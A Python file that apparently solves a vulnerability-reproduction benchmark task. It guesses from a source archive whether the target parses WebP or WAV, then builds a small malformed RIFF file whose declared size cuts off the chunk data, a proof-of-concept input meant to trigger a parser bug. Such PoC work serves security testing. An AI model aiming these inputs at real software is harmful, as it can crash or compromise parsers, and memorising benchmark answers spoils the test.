import os
import re
import struct
import tarfile
import zipfile
from typing import Dict, Iterable, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = self._guess_format(src_path)
        if fmt == "webp":
            return self._build_webp_poc()
        if fmt == "wav":
            return self._build_wav_poc()
        # Default to WAV: common RIFF consumer; PoC matches described RIFF-end size mismatch well
        return self._build_wav_poc()

    def _build_wav_poc(self) -> bytes:
        # RIFF size smaller than actual file, ends right after 'data' chunk header (no data inside RIFF)
        # Total length: 58 bytes
        riff = b"RIFF"
        riff_size = 36  # 4('WAVE') + (8+16) fmt + 8 data header, no data
        wave = b"WAVE"

        fmt_id = b"fmt "
        fmt_size = 16
        # PCM mono 8-bit 8000 Hz
        audio_format = 1
        num_channels = 1
        sample_rate = 8000
        bits_per_sample = 8
        block_align = num_channels * (bits_per_sample // 8)
        byte_rate = sample_rate * block_align
        fmt_data = struct.pack(
            "<HHIIHH",
            audio_format,
            num_channels,
            sample_rate,
            byte_rate,
            block_align,
            bits_per_sample,
        )

        data_id = b"data"
        data_size = 14
        data = b"\x00" * data_size

        out = bytearray()
        out += riff
        out += struct.pack("<I", riff_size)
        out += wave
        out += fmt_id
        out += struct.pack("<I", fmt_size)
        out += fmt_data
        out += data_id
        out += struct.pack("<I", data_size)
        out += data
        return bytes(out)

    def _build_webp_poc(self) -> bytes:
        # RIFF size ends right after VP8X chunk header; VP8X data lies outside RIFF
        # Total length: 30 bytes
        riff = b"RIFF"
        riff_size = 12  # 4('WEBP') + 8 VP8X header, no VP8X data inside RIFF
        webp = b"WEBP"
        vp8x = b"VP8X"
        vp8x_size = 10
        vp8x_data = b"\x00" * 10  # flags/reserved/width-1/height-1 all zeros

        out = bytearray()
        out += riff
        out += struct.pack("<I", riff_size)
        out += webp
        out += vp8x
        out += struct.pack("<I", vp8x_size)
        out += vp8x_data
        return bytes(out)

    def _guess_format(self, src_path: str) -> str:
        base = os.path.basename(src_path).lower()
        if "webp" in base:
            return "webp"
        if "wav" in base or "wave" in base or "sndfile" in base or "audio" in base:
            return "wav"

        pats = {
            "webp": [
                re.compile(rb"\bWEBP\b"),
                re.compile(rb"\bVP8X\b"),
                re.compile(rb"\bWebP\b"),
                re.compile(rb"webp", re.IGNORECASE),
                re.compile(rb"WebPDemux"),
                re.compile(rb"WebPDecode"),
            ],
            "wav": [
                re.compile(rb"\bWAVE\b"),
                re.compile(rb"\bfmt\s\b"),
                re.compile(rb"\bdata\b"),
                re.compile(rb"wav", re.IGNORECASE),
                re.compile(rb"sndfile", re.IGNORECASE),
                re.compile(rb"dr_wav", re.IGNORECASE),
            ],
        }

        score = {"webp": 0, "wav": 0}
        max_files = 300
        max_total = 24 * 1024 * 1024
        total_read = 0
        files_read = 0

        for name, data in self._iter_source_like_files(src_path):
            if files_read >= max_files or total_read >= max_total:
                break
            if not data:
                continue
            files_read += 1
            total_read += len(data)

            for k in ("webp", "wav"):
                for p in pats[k]:
                    if p.search(data) is not None:
                        score[k] += 1

            if score["webp"] >= 8 and score["webp"] >= score["wav"] + 2:
                return "webp"
            if score["wav"] >= 8 and score["wav"] >= score["webp"] + 2:
                return "wav"

        if score["webp"] > score["wav"]:
            return "webp"
        if score["wav"] > score["webp"]:
            return "wav"
        return "wav"

    def _iter_source_like_files(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        exts = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
            ".cmake", ".txt", ".md", ".rst",
            ".py", ".rs", ".go", ".java", ".kt",
            ".m", ".mm",
            ".in", ".ac", ".am", ".mk",
        }

        def want_file(n: str, size: int) -> bool:
            nl = n.lower()
            _, ext = os.path.splitext(nl)
            if ext not in exts:
                return False
            if size <= 0:
                return False
            if size > 600 * 1024:
                return False
            if any(part in nl for part in ("/.git/", "/.hg/", "/.svn/", "/third_party/", "/vendor/", "/node_modules/")):
                return False
            return True

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                    except OSError:
                        continue
                    rel = os.path.relpath(p, src_path)
                    if not want_file(rel.replace("\\", "/"), st.st_size):
                        continue
                    try:
                        with open(p, "rb") as f:
                            yield rel, f.read(256 * 1024)
                    except OSError:
                        continue
            return

        if zipfile.is_zipfile(src_path):
            try:
                with zipfile.ZipFile(src_path, "r") as zf:
                    for zi in zf.infolist():
                        if zi.is_dir():
                            continue
                        n = zi.filename
                        if not want_file(n, zi.file_size):
                            continue
                        try:
                            with zf.open(zi, "r") as f:
                                yield n, f.read(256 * 1024)
                        except OSError:
                            continue
            except OSError:
                return
            return

        if tarfile.is_tarfile(src_path):
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        n = m.name
                        if not want_file(n, m.size):
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            with f:
                                yield n, f.read(256 * 1024)
                        except OSError:
                            continue
            except OSError:
                return
            return

        # Fallback: treat as a single file
        try:
            with open(src_path, "rb") as f:
                yield os.path.basename(src_path), f.read(256 * 1024)
        except OSError:
            return